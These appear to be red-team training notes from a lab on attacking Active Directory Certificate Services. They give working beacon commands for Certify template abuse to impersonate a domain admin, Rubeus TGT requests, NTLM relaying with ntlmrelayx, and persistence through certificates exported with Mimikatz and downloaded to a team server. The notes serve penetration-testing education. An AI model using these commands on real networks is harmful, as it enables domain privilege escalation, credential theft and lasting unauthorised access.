Active Directory Certificate Services (AD CS) is a server role that allows you to build a public key infrastructure (PKI).  This can provide public key cryptography, digital certificates, and digital signature capabilities.  Some practical applications include Secure/Multipurpose Internet Mail Extensions (S/MIME), secure wireless networks, virtual private network (VPN), Internet Protocol security (IPsec), Encrypting File System (EFS), smart card logon, and Secure Socket Layer/Transport Layer Security (SSL/TLS).

Correct implementation can improve the security of an organisation:

1. Confidentiality through encryption.
2. Integrity through digital signatures.
3. Authentication by associating certificate keys with computer, user, or device accounts on the network.

However, like any technology, misconfigurations can introduce security risks that actors can exploit - in this case, for privilege escalation (even domain user to domain admin) and persistence.  The content found in this module is derived from the 143-page whitepaper published by Will Schroeder & Lee Christensen.  For obvious reasons, the entire content will not be duplicated here - if you want all the low-level details, do go and read it.

# Finding Certificate Authorities 

To find AD CS Certificate Authorities (CA's) in a domain or forest, run Certify with the cas parameter.

    beacon> execute-assembly C:\Tools\Certify\Certify\bin\Release\Certify.exe cas

This will output lots of useful information, including the root CA and subordinate CAs:

    Enterprise CA Name            : ca
    DNS Hostname                  : dc-1.cyberbotic.io
    FullName                      : dc-1.cyberbotic.io\ca
    Flags                         : SUPPORTS_NT_AUTHENTICATION, CA_SERVERTYPE_ADVANCED
    Cert SubjectName              : CN=ca, DC=cyberbotic, DC=io
    Cert Thumbprint               : 95AF7043BD6241CEE92E6DC6CB8D22494E396CCF
    Cert Serial                   : 17DDB078863F61884B680FE6F59211AD
    Cert Start Date               : 8/15/2022 3:42:59 PM
    Cert End Date                 : 8/15/2047 3:52:59 PM
    Cert Chain                    : CN=ca,DC=cyberbotic,DC=io
    
    Enterprise CA Name            : sub-ca
    DNS Hostname                  : dc-2.dev.cyberbotic.io
    FullName                      : dc-2.dev.cyberbotic.io\sub-ca
    Flags                         : SUPPORTS_NT_AUTHENTICATION, CA_SERVERTYPE_ADVANCED
    Cert SubjectName              : CN=sub-ca, DC=dev, DC=cyberbotic, DC=io
    Cert Thumbprint               : 697B1C2CD65B2ADC80C3D0CE83A6FB889B0CA08E
    Cert Serial                   : 13000000046EF818036CF8C99F000000000004
    Cert Start Date               : 8/15/2022 4:06:13 PM
    Cert End Date                 : 8/15/2024 4:16:13 PM
    Cert Chain                    : CN=ca,DC=cyberbotic,DC=io -> CN=sub-ca,DC=dev,DC=cyberbotic,DC=io

The Cert Chain is useful to note, as this shows us that "sub-ca" in the DEV domain is a subordinate of "ca" in the CYBER domain.  The output will also list the certificate templates that are available at each CA, as well as some information about which principals are allowed to manage them.

# Misconfigured Certificate Templates

AD CS certificate templates are provided by Microsoft as a starting point for distributing certificates.  They are designed to be duplicated and configured for specific needs.  Misconfigurations within these templates can be abused for privilege escalation. Certify can also find vulnerable templates.

    beacon> execute-assembly C:\Tools\Certify\Certify\bin\Release\Certify.exe find /vulnerable

Let's go through the key parts of this output.

1. This template is served by sub-ca.
2. The template is called CustomUser.
3. ENROLLEE_SUPPLIES_SUBJECT is enabled, which allows the certificate requestor to provide any SAN (subject alternative name).
4. The certificate usage has Client Authentication set.
5. DEV\Domain Users have enrollment rights, so any domain user may request a certificate from this template.

- If a principal you control has WriteOwner, WriteDacl or WriteProperty, then this could also be abused.

This configuration allows any domain user to request a certificate for any other domain user (including a domain admin) and use it for authentication.  Request a certificate for nlamb.

    beacon> getuid
    [*] You are DEV\bfarmer

    beacon> execute-assembly C:\Tools\Certify\Certify\bin\Release\Certify.exe request /ca:dc-2.dev.cyberbotic.io\sub-ca /template:CustomUser /altname:nlamb

Copy the whole certificate (both the private key and certificate) and save it to cert.pem on Ubuntu WSL.  Then use the provided openssl command to convert it to pfx format.

    ubuntu@DESKTOP-3BSK7NO ~> openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
    Enter Export Password: pass123
    Verifying - Enter Export Password: pass123

Convert cert.pfx into a base64 encoded string so it can be used with Rubeus

    ubuntu@DESKTOP-3BSK7NO ~> cat cert.pfx | base64 -w 0

Then use asktgt to request a TGT for the user using the certificate.

    beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:nlamb /certificate:MIIM7w[...]ECAggA /password:pass123 /nowrap
    
# NTLM Relaying to ADCS HTTP Endpoints

AD CS services support HTTP enrolment methods and even includes a GUI.  This endpoint is usually found at http[s]://<hostname>/certsrv.

If NTLM authentication is enabled, these endpoints are vulnerable to NTLM relay attacks.  A common abuse method is to coerce a domain controller to authenticate to an attacker-controlled location, relay the request to a CA to obtain a certificate for that DC, and then use it to obtain a TGT.

An important aspect to be aware of is that you cannot relay NTLM authentication back to the originating machine.  We therefore wouldn't be able to relay a DC to a CA if those services were running on the same machine.  This is indeed the case in the RTO lab, as each CA is running on a DC.

Another good way to abuse this primitive is by gaining access to a machine configured for unconstrained delegation.
- We already have access to WEB as jking, but this is another way of achieving the same end.

To achieve this, we need:

- PortBender on Workstation 2 to capture traffic on port 445 and redirect it to port 8445.
- A reverse port forward to forward traffic hitting port 8445 to the team server on port 445.
- A SOCKS proxy for ntlmrelayx to send traffic back into the network.

The ntlmrelayx command needs to target the certfnsh.asp page on the ADCS server.

    attacker@ubuntu ~> sudo proxychains ntlmrelayx.py -t https://10.10.122.10/certsrv/certfnsh.asp -smb2support --adcs --no-http-server

Then force the authentication to occur from WEB to WKSTN-2.

    beacon> execute-assembly C:\Tools\SharpSystemTriggers\SharpSpoolTrigger\bin\Release\SharpSpoolTrigger.exe 10.10.122.30 10.10.123.102

The S4U2Self trick can be used to obtain usable TGS's to move laterally to it.

# User & Computer Persistence 

Certificates can also be useful for maintaining persistent access to both users and computers, because they tend to have a longer shelf-life compared to passwords.  For example, User certificates are valid for an entire year by default, regardless of password changes.

    CA Name             : dc-2.dev.cyberbotic.io\sub-ca
    Template Name       : User
    Schema Version      : 1
    Validity Period     : 1 year
    
Certificates only become invalid if they're revoked by the CA (or expire).  This also does not rely on any vulnerable templates.  We can extract certificates that have already been issued, or just request new ones.

## User Persistence 

User certificates that have already been issued can be found in the user's Personal Certificate store. If we have a Beacon running on their machine, we can enumerate their certificates with Seatbelt.

    beacon> getuid
    [*] You are DEV\nlamb
    
    beacon> run hostname
    wkstn-1

    beacon> execute-assembly C:\Tools\Seatbelt\Seatbelt\bin\Release\Seatbelt.exe Certificates

- Always ensure the certificate is used for client authentication.

Certificates can be exported with Mimikatz using crypto::certificates (although it drops them to disk).

    beacon> mimikatz crypto::certificates /export

    beacon> download CURRENT_USER_My_0_Nina Lamb.pfx
    [*] started download of C:\Users\nlamb\CURRENT_USER_My_0_Nina Lamb.pfx (3454 bytes)
    [*] download of CURRENT_USER_My_0_Nina Lamb.pfx is complete

- Go to View > Downloads to sync files from Cobalt Strike to your local machine.

Base64 encode the pfx file.

    ubuntu@DESKTOP-3BSK7NO ~> cat /mnt/c/Users/Attacker/Desktop/CURRENT_USER_My_0_Nina\ Lamb.pfx | base64 -w 0

Then use it with Rubeus to obtain a TGT.  The export password will be mimikatz.

    beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:nlamb /certificate:MIINeg[...]IH0A== /password:mimikatz /nowrap

- You may notice that this will request RC4 tickets by default.  You can force the use of AES256 by including the /enctype:aes256 parameter.

If the user does not have a certificate in their store, we can just request one with Certify.

beacon> execute-assembly C:\Tools\Certify\Certify\bin\Release\Certify.exe request /ca:dc-2.dev.cyberbotic.io\sub-ca /template:User

## Computer Persistence

The same can be applied to computer accounts, but we must elevate to extract those certificates.

    beacon> mimikatz !crypto::certificates /systemstore:local_machine /export

      Public export  : OK - 'local_machine_My_0_wkstn-1.dev.cyberbotic.io.der'
      Private export : OK - 'local_machine_My_0_wkstn-1.dev.cyberbotic.io.pfx'
    
    beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:WKSTN-1$ /enctype:aes256 /certificate:MIINCA[...]IH0A== /password:mimikatz /nowrap
    
    [*] Action: Ask TGT

If requesting a machine certificate with Certify, the /machine parameter is required to auto-elevate to SYSTEM and assume the identity of the computer account.

    beacon> execute-assembly C:\Tools\Certify\Certify\bin\Release\Certify.exe request /ca:dc-2.dev.cyberbotic.io\sub-ca /template:Machine /machine
